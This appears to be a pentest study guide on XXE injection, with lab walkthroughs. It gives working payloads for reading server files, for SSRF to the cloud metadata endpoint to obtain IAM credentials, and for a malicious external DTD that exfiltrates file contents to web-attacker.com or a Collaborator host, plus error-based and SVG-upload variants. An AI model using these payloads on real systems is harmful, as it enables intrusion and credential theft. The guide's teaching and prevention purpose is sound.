# XXE injection (Xml eXternal Entity)

* XXE is a vulnerability that allows an attacker to interfere with an application's processing of XML data.
* It allows an attacker to view files on the application server filesystem.
* It can also interact with any back-end or external system that the application can access.
* An attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure by leveraging the XXE vulnerability to perform SSRF attacks.

***

## How do XXE vulnerabilities arise?

* Some applications use XML to transit data between the browser and the server.
* These applications use standard libraries or APIs to process the XML data on the server.
* The XML specification contains various potentially dangerous features.
* Standard parsers often support these features even if they are not normally used by the application.

***

## XML entities

* XML = extensible markup language.
* Used for storing and transporting data, similar to HTML.
* Uses a tree-like structure of tags and data.
* XML vs HTML: XML doesn't use predefined tags — tags can be given names that describe the data.

Example of XML:

```xml
<note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend!</body>
</note>
```

* `<note>` is the root element.
* `<to>, <from>, <heading>, <body>` are child elements of `<note>`.

***

## What are XML entities?

* XML entities are ways of representing an item of data within an XML document.
* These are built-in elements that can be used instead of the data itself.
* `&lt;` and `&gt;` represent the characters `<` and `>`:
  * These are meta characters used to denote XML tags.
  * They must generally be represented using entities when they appear within data.

***

## What is a Document Type Definition (DTD)?

* The XML Document Type Definition (DTD) contains declarations that can define:
  * The structure of an XML document.
  * Types of data values.
  * Other items.
* The DTD is declared with the optional `DOCTYPE` element at the start of the XML document.
* The DTD can be:
  * Fully self-contained within the document itself (Internal DTD).
  * Loaded from elsewhere (External DTD).
  * A hybrid of the two.

***

## What are XML custom entities?

* XML allows custom entities to be defined within the DTD.
*   Example:

    ```xml
    <!DOCTYPE foo [<!ENTITY myentity "my entity value" >]>
    ```

    * Any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value `my entity value`.

***

## What are XML external entities?

* They are entities whose values are loaded from a URL specified in the DTD using the `SYSTEM` keyword.
  *   Example:

      ```xml
      <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
      ```
*   The URL can use the `file://` protocol so external entities can be loaded from local files:

    ```xml
    <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
    ```
* XML external entities are the primary means by which XML attacks arise.

***

## Types of XXE attacks

{% stepper %}
{% step %}
### Exploiting XXE to retrieve files

* Define an external entity containing the path to a file and use it in XML data that the application returns in responses.
* Example scenario: a shopping application sends XML to check stock:

Original request:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

Exploit payload to retrieve `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

* The response may include the contents of `/etc/passwd`, e.g.:

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Note: In real-world XML there are many data nodes; test each node individually by inserting your defined entity and checking responses.
{% endstep %}

{% step %}
### Exploiting XXE to perform SSRF attacks

* Define an external entity that references an internal URL the server can reach and use it in returned data.
* Example:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

* Can be used to cause the server to request internal resources (including cloud metadata endpoints).
{% endstep %}

{% step %}
### Exploiting blind XXE to exfiltrate data out-of-band

* Use an external entity referencing a URL under attacker control (DNS/HTTP) to detect interactions.
* Example:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

* Monitor DNS/HTTP interactions (e.g., with Burp Collaborator) to detect blind XXE.
* Advanced: host a malicious external DTD that causes the server to fetch sensitive files and exfiltrate them via HTTP/FTP requests.
{% endstep %}

{% step %}
### Exploiting blind XXE to retrieve data via error messages

* Use a malicious DTD that triggers an XML parser error containing file contents.
* Example DTD (error-based):

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

* When parsed, the error message may include the contents of `/etc/passwd`.
{% endstep %}
{% endstepper %}

***

## Exploiting XXE to retrieve files — Lab

{% stepper %}
{% step %}
#### Lab - Introduction

* Web\_Pentest400: pentester finds a "check stock" feature that parses XML input.
{% endstep %}

{% step %}
#### Vulnerability - Problem

* The application returns unexpected values in responses and performs no XXE defenses.
{% endstep %}

{% step %}
#### Payload & End-goal

* Goal: inject an XML external entity to retrieve `/etc/passwd`.
* Payload: `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
{% endstep %}

{% step %}
#### Reconnaissance Plan

* Visit a product page, click "check stock".
* Intercept the resulting POST request in Burp Suite.
{% endstep %}

{% step %}
#### Attack

* Insert the external entity definition between the XML declaration and the `stockCheck` element: `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
* Replace the `productId` value with `&xxe;`.
{% endstep %}

{% step %}
#### Exploit & Enumerate

* The response may show "Invalid product ID:" followed by `/etc/passwd` contents.
* To test thoroughly, try each XML data node.
{% endstep %}

{% step %}
#### Mitigation

* Suggests three points (see "How to prevent XXE vulnerabilities" section).
{% endstep %}

{% step %}
#### Notes

* Like, Follow & Subscribe (closing remark).
{% endstep %}
{% endstepper %}

***

## Exploit XXE to perform SSRF attacks — Lab

{% stepper %}
{% step %}
#### Lab - Introduction

* Web\_Pentest401: pentester finds a "check stock" feature that parses XML input.
{% endstep %}

{% step %}
#### Vulnerability - Problem

* The application returns unexpected values in responses. The server runs a simulated EC2 metadata endpoint.
{% endstep %}

{% step %}
#### Payload & End-goal

* Goal: retrieve instance metadata at `http://169.254.169.254/`, obtain IAM credentials.
* Payload: `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`
{% endstep %}

{% step %}
#### Reconnaissance Plan

* Visit product page, click "check stock".
* Intercept POST request in Burp.
{% endstep %}

{% step %}
#### Attack

* Insert: `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`
* Replace `productId` with `&xxe;`.
{% endstep %}

{% step %}
#### Exploit & Enumerate

* The response may contain metadata. Iterate URLs to reach `/latest/meta-data/iam/security-credentials/admin` to find `secretAccessKey`.
{% endstep %}

{% step %}
#### Mitigation

* Suggests three points (see "How to prevent XXE vulnerabilities").
{% endstep %}

{% step %}
#### Notes

* Like, Follow & Subscribe (closing remark).
{% endstep %}
{% endstepper %}

***

## Finding hidden attack surface for XXE injection

* HTTP traffic that contains XML is an obvious attack surface.
* Hidden attack surface: places where non-XML client data is embedded server-side into an XML document and then parsed.
* XInclude attacks can exploit such cases when you control a single data node but cannot define a DOCTYPE.

XInclude example:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

***

## Exploiting XInclude to retrieve files — Lab

{% stepper %}
{% step %}
#### Lab - Introduction

* Web\_Pentest402: pentester finds a "check stock" feature that embeds user input inside a server-side XML document which is parsed.
{% endstep %}

{% step %}
#### Vulnerability - Problem

* The server-side XML is parsed but the attacker cannot define a DTD.
{% endstep %}

{% step %}
#### Payload & End-goal

* Goal: inject an XInclude to retrieve `/etc/passwd`.
* Payload: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
{% endstep %}

{% step %}
#### Reconnaissance Plan

* Visit product page, click "check stock".
* Intercept POST in Burp Suite.
{% endstep %}

{% step %}
#### Attack

* Set `productId` to: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
* If included file is not valid XML, use `parse="text"` to include as text.
{% endstep %}

{% step %}
#### Exploit & Enumerate

* The response may display the file contents.
{% endstep %}

{% step %}
#### Notes

* Like, Follow & Subscribe (closing remark).
{% endstep %}
{% endstepper %}

***

## XXE attacks via file upload

* Some applications accept uploaded files that are processed server-side (e.g., DOCX, SVG), which are XML formats.
* If an image processing library supports SVG, an attacker can upload a malicious SVG containing XML external entities.

Example: malicious SVG to read `/etc/hostname`:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

***

## Lab: Exploiting XXE via image file upload

{% stepper %}
{% step %}
#### Lab - Introduction

* Web\_Pentest403: pentester finds an avatar upload function.
{% endstep %}

{% step %}
#### Vulnerability - Problem

* The server uses Apache Batik (SVG processing) to handle avatar images.
{% endstep %}

{% step %}
#### Payload & End-goal

* Goal: upload an SVG that displays contents of `/etc/hostname`.
* Payload: the SVG shown above.
{% endstep %}

{% step %}
#### Reconnaissance Plan

* Create a local SVG with the external entity & text element.
* Post a comment or upload the SVG as an avatar.
{% endstep %}

{% step %}
#### Attack

* Upload the SVG image.
* View the comment or avatar that displays the image.
{% endstep %}

{% step %}
#### Exploit & Enumerate

* The image should show the server hostname (contents of `/etc/hostname`).
{% endstep %}

{% step %}
#### Notes

* Like, Follow & Subscribe (closing remark).
{% endstep %}
{% endstepper %}

***

## XXE attacks via modified content type

* Many HTML forms submit with `Content-Type: application/x-www-form-urlencoded`.
* Some servers tolerate other content types (e.g., `text/xml`) and will parse the body as XML.
* You can reach hidden XXE surfaces by reformatting requests to send XML:

Form-encoded example:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

XML example:

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

If the application parses the body as XML, you can attempt XXE by sending an XML body.

***

## Blind XXE vulnerabilities

* Many XXE instances are blind: the application does not return defined external entities in responses.
* Direct retrieval of server files is not possible; use out-of-band (OAST) techniques or trigger parser errors.
* Use defined external entities that reference attacker-controlled domains to detect DNS/HTTP interactions.

Example out-of-band entity:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
```

***

## Blind XXE with out-of-band interaction — Lab

{% stepper %}
{% step %}
#### Lab - Introduction

* Web\_Pentest404: pentester finds a "check stock" feature that parses XML input.
{% endstep %}

{% step %}
#### Vulnerability - Problem

* The application parses XML but does not display entity values (blind XXE).
{% endstep %}

{% step %}
#### Payload & End-goal

* Goal: make the XML parser issue a DNS lookup to a domain you control (Burp Collaborator).
* Payload: insert a Collaborator URL into an external entity.
{% endstep %}

{% step %}
#### Reconnaissance Plan

* Visit product page, click "check stock".
* Intercept POST in Burp; insert Collaborator payload between XML declaration and `stockCheck`: `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
{% endstep %}

{% step %}
#### Attack

* Replace `productId` with `&xxe;`.
* Poll Collaborator and observe DNS/HTTP interactions initiated by the server.
{% endstep %}

{% step %}
#### Notes

* Like, Follow & Subscribe (closing remark).
{% endstep %}
{% endstepper %}

***

## Points to note about parameter entities

* Regular external entities are sometimes blocked (input validation or parser hardening).
* Use XML parameter entities as an alternative; they are referenced using `%` instead of `&`.
  * Declaration: `<!ENTITY % myparameterentity "value" >`
  * Reference: `%myparameterentity;`
* Example for blind XXE detection via parameter entity:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

***

## Blind XXE with parameter entities — Lab

{% stepper %}
{% step %}
#### Lab - Introduction

* Web\_Pentest405: pentester finds a "check stock" feature that parses XML.
{% endstep %}

{% step %}
#### Vulnerability - Problem

* The application blocks regular external entities but still parses XML.
{% endstep %}

{% step %}
#### Payload & End-goal

* Goal: make the XML parser issue DNS/HTTP lookups using a parameter entity and Burp Collaborator.
* Payload: `<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`
{% endstep %}

{% step %}
#### Reconnaissance Plan

* Intercept POST request for "Check stock".
* Insert the parameter-entity definition between the XML declaration and `stockCheck`.
* Use Burp Collaborator to generate the unique subdomain.
{% endstep %}

{% step %}
#### Attack

* Send the request and poll Collaborator for interactions.
{% endstep %}

{% step %}
#### Exploit & Enumerate

* You should see DNS/HTTP interactions initiated by the server.
{% endstep %}

{% step %}
#### Notes

* Like, Follow & Subscribe (closing remark).
{% endstep %}
{% endstepper %}

***

## Exploiting blind XXE to exfiltrate data out-of-band

* Host a malicious DTD on a server you control. The malicious DTD can read local files and cause the parser to request an attacker-controlled URL containing the file contents.
* Example malicious DTD:

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

* Host as: `http://web-attacker.com/malicious.dtd`

Exploit payload:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

* The parser fetches and interprets the external DTD, which causes an HTTP request to the attacker server containing file contents.

Notes:

* Newlines in file contents can block some exfiltration methods; FTP may be used as an alternative, or target files without newlines (e.g., `/etc/hostname`).

***

## Lab: Exfiltrate data using a malicious external DTD

{% stepper %}
{% step %}
#### Lab - Introduction

* Web\_Pentest406: pentester finds a "check stock" feature that parses XML.
{% endstep %}

{% step %}
#### Vulnerability - Problem

* The application parses XML but does not display entity values; regular external entities are blocked.
{% endstep %}

{% step %}
#### Payload & End-goal

* Goal: exfiltrate `/etc/hostname` using a malicious external DTD hosted on an exploit server.
* Payload to reference the DTD: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
{% endstep %}

{% step %}
#### Reconnaissance Plan

* Generate a unique Burp Collaborator payload and embed it into a DTD file hosted on your exploit server.
* Note the hosted DTD URL.
{% endstep %}

{% step %}
#### Attack

* Intercept the POST for stock check, insert: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
* Send the request.
{% endstep %}

{% step %}
#### Exploit & Enumerate

* Poll Collaborator; you should see DNS/HTTP interactions. The HTTP interaction may include `/etc/hostname` contents.
{% endstep %}

{% step %}
#### Notes

* Like, Follow & Subscribe (closing remark).
{% endstep %}
{% endstepper %}

DTD payload example:

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

***

## Exploiting blind XXE to retrieve data via error messages

* Use a malicious external DTD that constructs an entity pointing to a nonexistent path incorporating the file contents; the parser error may include file contents.
* Example DTD:

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

* Resulting parser error might look like:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:...
```

***

## Lab: Exploiting blind XXE to retrieve data via error messages

{% stepper %}
{% step %}
#### Lab - Introduction

* Web\_Pentest407: pentester finds a "check stock" feature that parses XML.
{% endstep %}

{% step %}
#### Vulnerability - Problem

* The application parses XML but does not display entity values and blocks regular external entities.
* Host a malicious DTD on a server you control which uses the error-based technique.
{% endstep %}

{% step %}
#### Payload & End-goal

* Goal: trigger an error message that displays `/etc/passwd`.
* External DTD (hosted on exploit server) contains:

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
{% endstep %}

{% step %}
#### Reconnaissance Plan

* Save the malicious DTD on the exploit server and note its URL.
{% endstep %}

{% step %}
#### Attack

* Intercept the POST for stock check and add a parameter entity referring to the malicious DTD: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-.../exploit"> %xxe;]>`
{% endstep %}

{% step %}
#### Exploit & Enumerate

* The response may contain an error message with `/etc/passwd` contents.
{% endstep %}

{% step %}
#### Notes

* Like, Follow & Subscribe (closing remark).
{% endstep %}
{% endstepper %}

***

## Exploiting blind XXE by repurposing a local DTD

* Some systems include local DTD files on the filesystem. If the application allows hybrid DTDs (internal + external), you can:
  * Import a local DTD via an internal DTD parameter.
  * Redefine an entity declared in the local DTD to trigger error-based leakage.

Example hybrid DTD technique (repurpose a local DTD at `/usr/local/app/schema.dtd`):

```dtd
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

* You can enumerate common local DTD paths (e.g., GNOME: `/usr/share/yelp/dtd/docbookx.dtd`) and test for presence by attempting to load them.

Example test:

```dtd
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

***

## Lab: Repurposing a local DTD to retrieve data

{% stepper %}
{% step %}
#### Lab - Introduction

* Web\_Pentest408: pentester finds a "check stock" feature that parses XML.
{% endstep %}

{% step %}
#### Vulnerability - Problem

* The application parses XML but does not display entity values.
* Systems with GNOME often have `/usr/share/yelp/dtd/docbookx.dtd` containing an entity `ISOamso`.
{% endstep %}

{% step %}
#### Payload & End-goal

* Goal: trigger an error message containing `/etc/passwd` by referencing an existing DTD and redefining an entity from it.
* Hybrid payload (example):

```dtd
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
{% endstep %}

{% step %}
#### Reconnaissance Plan

* Intercept the POST for stock check; insert the hybrid parameter entity between XML declaration and `stockCheck`.
{% endstep %}

{% step %}
#### Attack

* Send the request in Repeater; this imports the local DTD and redefines `ISOamso`.
{% endstep %}

{% step %}
#### Exploit & Enumerate

* The response error message may include `/etc/passwd` contents.
{% endstep %}

{% step %}
#### Notes

* Like, Follow & Subscribe (closing remark).
{% endstep %}
{% endstepper %}

***

## How to find and test for XXE vulnerabilities

1. Use automated scanners (e.g., Burp Suite web vulnerability scanner) to save time.
2. Manual testing:
   * Test for file retrieval: define an external entity pointing to well-known files and use it in data returned by the application.
   * Test for blind XXE: define external entities pointing to a domain you control and monitor interactions (Burp Collaborator).
   * Test for vulnerable inclusion: if user-supplied non-XML data is embedded server-side into XML, try XInclude to retrieve files.
3. Remember XML can be a vector for other vulnerabilities (XSS, SQL injection). You may need to escape payloads or use XML escaping to obfuscate payloads.

***

## How to prevent XXE vulnerabilities

* Disable XML parsing libraries where possible or avoid parsing XML where not needed.
* Disable external entities and disable support for XInclude via configuration or programmatically.
* Consult your XML parsing library or API documentation for details on disabling unnecessary capabilities.

***
